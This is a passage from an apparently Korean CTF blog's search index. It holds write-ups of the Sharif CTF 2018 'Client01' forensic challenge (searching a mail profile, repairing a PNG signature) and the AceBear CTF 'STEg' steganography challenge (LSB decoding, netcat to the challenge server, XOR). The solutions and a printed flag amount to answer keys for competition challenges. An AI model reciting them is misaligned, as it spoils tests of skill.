존재하는 것을 확인해 볼 수 있었다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01\n <span class=\"nb\">grep</span> <span class=\"nt\">-r</span> <span class=\"s2\">\"flag\"</span> ./client01\nBinary file ./client01/.mozilla/firefox/c3a958fk.default/places.sqlite matches\nBinary file ./client01/.mozilla/firefox/c3a958fk.default/secmod.db matches\n./client01/.thunderbird/5bd7jhog.default/blocklist-addons.json:        <span class=\"s2\">\"why\"</span>: <span class=\"s2\">\"Certain versions of this add-on contains an executable that is flagged by multiple tools as malware. Newer versions no longer use it.\"</span>,\nBinary file ./client01/.thunderbird/5bd7jhog.default/calendar-data/local.sqlite matches\nBinary file ./client01/.thunderbird/5bd7jhog.default/global-messages-db.sqlite matches\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:  <span class=\"o\">(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)(</span><span class=\"nv\">8A</span><span class=\"o\">=</span>label<span class=\"o\">)(</span><span class=\"nv\">8B</span><span class=\"o\">=</span>statusOfset<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:&lt;<span class=\"o\">(</span><span class=\"nv\">93</span><span class=\"o\">=</span>flag<span class=\"o\">)&gt;[</span>3:^9A<span class=\"o\">(</span>^95^93<span class=\"o\">)]</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:    <span class=\"o\">={</span><span class=\"s2\">\"threadCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"s2\">\"ordinal\"</span>:<span class=\"s2\">\"1\"</span><span class=\"o\">}</span>,<span class=\"s2\">\"flaggedCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"se\">\\</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Drafts.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Drafts.msf:    <span class=\"o\">={</span><span class=\"s2\">\"threadCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true<span class=\"o\">}</span>,<span class=\"s2\">\"attachmentCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true<span class=\"o\">}</span>,<span class=\"s2\">\"flaggedCo</span><span class=\"se\">\\</span><span class=\"s2\">\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Important.msf:  (87=size)(88=flags)(89=priority)(8A=label)(8B=statusOfset)(8C=numLines)\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Important.msf:    ={\"</span>threadCol<span class=\"s2\">\":{\"</span>visible<span class=\"s2\">\":true,\"</span>ordinal<span class=\"s2\">\":\"</span>1<span class=\"s2\">\"},\"</span>flaggedCol<span class=\"s2\">\":{\"</span>visible<span class=\"s2\">\":true,</span><span class=\"se\">\\</span><span class=\"s2\">\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Sent Mail.msf:  (88=flags)(89=priority)(8A=label)(8B=statusOfset)(8C=numLines)\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Sent Mail.msf:    ={\"</span>threadCol<span class=\"s2\">\":{\"</span>visible<span class=\"s2\">\":true},\"</span>attachmentCol<span class=\"s2\">\":{\"</span>visible<span class=\"s2\">\":true},\"</span>flaggedCo<span class=\"se\">\\</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Spam.msf:  <span class=\"o\">(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)(</span><span class=\"nv\">8A</span><span class=\"o\">=</span>label<span class=\"o\">)(</span><span class=\"nv\">8B</span><span class=\"o\">=</span>statusOfset<span class=\"o\">)(</span><span class=\"nv\">8C</span><span class=\"o\">=</span>numLines<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Spam.msf:    <span class=\"o\">={</span><span class=\"s2\">\"threadCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"s2\">\"ordinal\"</span>:<span class=\"s2\">\"1\"</span><span class=\"o\">}</span>,<span class=\"s2\">\"flaggedCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"se\">\\</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Starred.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash:Subject: flag\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:  <span class=\"o\">(</span><span class=\"nv\">AA</span><span class=\"o\">=</span>flag<span class=\"o\">)(</span>AB\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:    <span class=\"o\">={</span><span class=\"s2\">\"threadCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"s2\">\"ordinal\"</span>:<span class=\"s2\">\"1\"</span><span class=\"o\">}</span>,<span class=\"s2\">\"flaggedCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"se\">\\</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Archives.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Drafts.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX:Subject: flag\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX.msf:  <span class=\"o\">(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)(</span><span class=\"nv\">8A</span><span class=\"o\">=</span>label<span class=\"o\">)(</span><span class=\"nv\">8B</span><span class=\"o\">=</span>statusOfset<span class=\"o\">)(</span><span class=\"nv\">8C</span><span class=\"o\">=</span>numLines<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX.msf:    <span class=\"o\">={</span><span class=\"s2\">\"threadCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"s2\">\"ordinal\"</span>:<span class=\"s2\">\"1\"</span><span class=\"o\">}</span>,<span class=\"s2\">\"flaggedCol\"</span>:<span class=\"o\">{</span><span class=\"s2\">\"visible\"</span>:true,<span class=\"se\">\\</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Sent.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Templates.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\nBinary file ./client01/.thunderbird/5bd7jhog.default/kinto.sqlite matches\n./client01/.thunderbird/5bd7jhog.default/Mail/Local Folders/Trash.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/Mail/Local Folders/Unsent Messages.msf:  <span class=\"o\">(</span><span class=\"nv\">84</span><span class=\"o\">=</span>references<span class=\"o\">)(</span><span class=\"nv\">85</span><span class=\"o\">=</span>recipients<span class=\"o\">)(</span><span class=\"nv\">86</span><span class=\"o\">=</span>date<span class=\"o\">)(</span><span class=\"nv\">87</span><span class=\"o\">=</span>size<span class=\"o\">)(</span><span class=\"nv\">88</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">89</span><span class=\"o\">=</span>priority<span class=\"o\">)</span>\n./client01/.thunderbird/5bd7jhog.default/panacea.dat:  <span class=\"o\">(</span><span class=\"nv\">81</span><span class=\"o\">=</span>ns:msg:db:table:kind:folders<span class=\"o\">)(</span><span class=\"nv\">82</span><span class=\"o\">=</span>key<span class=\"o\">)(</span><span class=\"nv\">83</span><span class=\"o\">=</span>flags<span class=\"o\">)(</span><span class=\"nv\">84</span><span class=\"o\">=</span>totalMsgs<span class=\"o\">)</span>\nBinary file ./client01/.thunderbird/5bd7jhog.default/places.sqlite matches\nBinary file ./client01/.thunderbird/5bd7jhog.default/secmod.db matches\n./client01/.xsession-errors:    <span class=\"s1\">'su'</span>, <span class=\"o\">(</span>bus_name, flags<span class=\"o\">)))</span>\n./client01/.xsession-errors.old:    <span class=\"s1\">'su'</span>, <span class=\"o\">(</span>bus_name, flags<span class=\"o\">)))</span>\n\n</code></pre></div></div>\n\n<p>.thunderbird 파일 내에서 e-mail과 관련된 항목에서 해당 flag 문자열이 식별되는 것을 확인할 수 있었다. thunderbird 파일을 살펴본다. <code class=\"highlighter-rouge\">inbox</code> 항목 내에서 flag 라는 제목으로 수신된 email을 확인할 수 있으며, link 를 하나 식별할 수 있다.</p>\n\n<p><img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/inbox.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] inbox mail</i></p>\n\n<p>해당 링크 <code class=\"highlighter-rouge\">http://www.filehosting.org/file/details/720884/file</code>로 접속하면, 아래와 같이 download link를 redirect 할 mail을 입력할 수 있다.\n<img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/filedown1.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] file download1</i></p>\n\n<p>본인의 mail 주소를 넣고, inbox 함을 확인한 결과 file download를 수행할 수 있는 link를 받을 수 있었으며, 해당 파일을 정상적으로 download 할 수 있었다.\n<img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/filedown2.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] file download2</i></p>\n\n<p>download 받은 파일에 대해 확인해보면, data stream으로 식별되나 hex 값을 통해 signature가 손상된 PNG 파일임을 알 수 있다.\n<img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/file_information.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] file information</i></p>\n\n<p>올바른 signature 값으로 offset을 수정한 뒤, 해당 이미지를 열어보면 Flag을 식별할 수 있었다. (조금 잘려서 보이지만 식별하는데에는 이상이 없다.)</p>\n\n<p><img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/fixed.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] signature fix</i></p>\n\n<p><img src=\"/images/2018-02-15-Sharif-CTF-Client01-75/flag.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] flag</i></p>\n\n<p align=\"right\"><strong>SharifCTF{43215f0c5e005d4e557ddfe3f2e57df0}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_AceBear_CTF] STEg Challenge(996)",
      "category" : "CTF2018_acebear",
      "tags"     : "Forensic, MISC, steganography",
      "url"      : "/ctf/2018_acebear/2018/02/09/AceBear-CTF-STEg-Challenge-996/",
      "date"     : "2018-02-09 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Download: Link\nService: nc 35.200.176.244 33338\nauthor: komang4130</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/exercise.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] exercise</i></p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>AceBear CTF 에서 나왔던 Forensic/MISC 분야 중, 마지막 풀이 문제. JS 문제랑 마찬가지로 대회 당시에는 해결하지 못했다. 문제 제목에 대해서 조금만 더 고찰을 했었더라면 해결할 수 있었을텐데…</p>\n\n<p>link를 통해, 받은 rar 파일을 압축 해제하면, <code class=\"highlighter-rouge\">flag_enc.png</code> 파일을 하나 확인할 수 있다.</p>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/flag_enc.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] flag_enc.png</i></p>\n\n<p>이미지를 자세히 보면, 좌측 상단에 검정색 pixel 일부를 볼 수 있다. 당연히, pixel을 이용한 steganography 방식의 LSB 로 인식하고 접근했었는데 별짓을 다해도 의미있는 문자열을 확인할 수 없었던게 큰 문제였던 것 같다.</p>\n\n<p>문제를 보면, nc 로 socket 접속할 수 있는 server 가 하나 주어지는데, 접속해보면 아래와 같이 16byte의 data를 받아 base64로  encode 된 data를 receive할 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/data_recieve.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] encode data</i></p>\n\n<p>decode 하여, 확인해보면 flag_enc와 동일한 이미지인 것을 확인할 수 있는데, 자세히 보면 상단의 pixel 위치가 조금씩 다르다.\n<img src=\"/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/file1.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] decode data</i></p>\n\n<p>여기서 생각의 전환이 조금 필요했다. server로 부터 어떤 유의미한 데이터를 얻어낼 수 있는가 고민을 하다가 결국, 원점으로 돌아가 flag_enc 로부터 정보를 얻어내려 했던 것이 발목을 잡았다..</p>\n\n<p>결과적으로, 문제 제목에서 알 수 있듯이 <code class=\"highlighter-rouge\">STEg</code>, <code class=\"highlighter-rouge\">flag_enc</code> 라는 문자열에 주목해보자. enc라는 문자열은 무엇인가 encrypt 되었다는 것을 의미한다. 그렇다면, 어떤 로직을 통해 data가 encrypt 되었다는 것인데 pixel과 Image를 Steganography 적용하는 방식에서 사용될 수 있는 항목은 주로 lsb일 것이다.</p>\n\n<p>기존에 알고 있던 lsb 방식은 모두 이용해 보았지만 별 소득은 없었고, 구글을 뒤지다가 Python 과 관련된 도구에서 <code class=\"highlighter-rouge\">Stepic</code>라는 것을 찾을 수 있었다. (Python Steganography 라는 언급만 있었어도…ㅂㄷㅂㄷ)</p>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-STEg-Challenge-996/stepic.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] stepic stegano</i></p>\n\n<p>연속된 3개의 pixel 에 data를 은닉하는 방식의 lsb 인데, code 그대로 사용해 unhide 할 수 있다. (https://stackoverflow.com/questions/16838341/steganography-in-python-stepic)</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">PIL</span> <span class=\"kn\">import</span> <span class=\"n\">Image</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">decode_imdata</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"p\">):</span>\n    <span class=\"s\">'''Given a sequence of pixels, returns an iterator of characters\n    encoded in the image'''</span>\n\n    <span class=\"n\">imdata</span> <span class=\"o\">=</span> <span class=\"nb\">iter</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"p\">)</span>\n    <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>\n        <span class=\"n\">pixels</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">])</span>\n        <span class=\"n\">byte</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"k\">for</span> <span class=\"n\">c</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">7</span><span class=\"p\">):</span>\n            <span class=\"n\">byte</span> <span class=\"o\">|=</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"n\">c</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span>\n            <span class=\"n\">byte</span> <span class=\"o\">&lt;&lt;=</span> <span class=\"mi\">1</span>\n        <span class=\"n\">byte</span> <span class=\"o\">|=</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"mi\">7</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span>\n        <span class=\"k\">yield</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">byte</span><span class=\"p\">)</span>\n        <span class=\"k\">if</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n            <span class=\"k\">break</span>\n\n\n<span class=\"n\">im</span> <span class=\"o\">=</span> <span class=\"n\">Image</span><span class=\"o\">.</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s\">'test'</span><span class=\"p\">)</span>\n<span class=\"n\">data</span>  <span class=\"o\">=</span> <span class=\"s\">''</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">decode_imdata</span><span class=\"p\">(</span><span class=\"n\">im</span><span class=\"o\">.</span><span class=\"n\">getdata</span><span class=\"p\">()))</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s\">'hex'</span><span class=\"p\">)</span>\n<span class=\"k\">print</span> <span class=\"n\">data</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<p>위 code로 서버로부터 받은 <code class=\"highlighter-rouge\">encode data</code>와 <code class=\"highlighter-rouge\">flag_enc.png</code>를 unhide 했을 때, 아래와 같은 문자열을 얻을 수 있었다. 무엇인가 복호화가 된다는 사실이 일단 실마리이다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg\n python ./steg.py\n|vohenrbuq<span class=\"o\">{</span>nxe\n</code></pre></div></div>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg\n python ./steg.py\n53:<span class=\"o\">)</span>~&gt;1&amp;v1z4hu\n</code></pre></div></div>\n\n<p>굳이, server로부터 encode data를 주는 이유는 무엇일까? 해당 data로부터 알아내야할 것이 있다는 말이다. <code class=\"highlighter-rouge\">flag_enc.png</code>로부터 unhide 했을 때, 별 소득이 없었으므로 해당 결과 값에 영향을 미칠만한 항목을 찾아냈어야 했다. (이 부분에서도 꽤 많은 시간을 쏟았다.)</p>\n\n<p>여러 data 를 server 로 send 하다가, <code class=\"highlighter-rouge\">\\x00</code> 로만 16byte를 채워보내고 받은 encode data에 대해서 unhide 한 결과 식별할 수 있는 string(<code class=\"highlighter-rouge\">OMG_YOU_BREAK_IT</code>)을 얻을 수 있었다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg\n python <span class=\"nt\">-c</span> “print ‘<span class=\"se\">\\x</span>00’<span class=\"k\">*</span>16” | nc localhost 33338 | base64 <span class=\"nt\">-D</span> <span class=\"o\">&gt;</span> tmp.png\n\njsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg\n python ./steg.py\nOMG_YOU_BREAK_IT\n</code></pre></div></div>\n\n<p>또 여기서, 삽질했던게 Null로 얻은 문자열 길이는 16byte인데 flag_enc.png 에서 얻은 문자열 길이는 14byte이다.. 기왕 내는거 길이 좀 맞춰서 내지;; 14byte 까지만 각각의 문자열을 xor 할 경우 flag를 확인할 수 있었다;;;</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">PIL</span> <span class=\"kn\">import</span> <span class=\"n\">Image</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">decode_imdata</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"p\">):</span>\n    <span class=\"s\">'''Given a sequence of pixels, returns an iterator of characters\n    encoded in the image'''</span>\n\n    <span class=\"n\">imdata</span> <span class=\"o\">=</span> <span class=\"nb\">iter</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"p\">)</span>\n    <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>\n        <span class=\"n\">pixels</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"n\">imdata</span><span class=\"o\">.</span><span class=\"nb\">next</span><span class=\"p\">()[:</span><span class=\"mi\">3</span><span class=\"p\">])</span>\n        <span class=\"n\">byte</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"k\">for</span> <span class=\"n\">c</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">7</span><span class=\"p\">):</span>\n            <span class=\"n\">byte</span> <span class=\"o\">|=</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"n\">c</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span>\n            <span class=\"n\">byte</span> <span class=\"o\">&lt;&lt;=</span> <span class=\"mi\">1</span>\n        <span class=\"n\">byte</span> <span class=\"o\">|=</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"mi\">7</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span>\n        <span class=\"k\">yield</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">byte</span><span class=\"p\">)</span>\n        <span class=\"k\">if</span> <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n            <span class=\"k\">break</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">strxor</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">,</span><span class=\"n\">b</span><span class=\"p\">):</span>\n    <span class=\"k\">return</span> <span class=\"s\">''</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span><span class=\"o\">^</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"p\">))</span> <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)</span> <span class=\"ow\">in</span> <span class=\"nb\">zip</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">,</span><span class=\"n\">b</span><span class=\"p\">))</span>\n\n\n<span class=\"n\">im</span> <span class=\"o\">=</span> <span class=\"n\">Image</span><span class=\"o\">.</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s\">'flag_enc.png'</span><span class=\"p\">)</span>\n<span class=\"n\">data</span>  <span class=\"o\">=</span> <span class=\"s\">''</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span 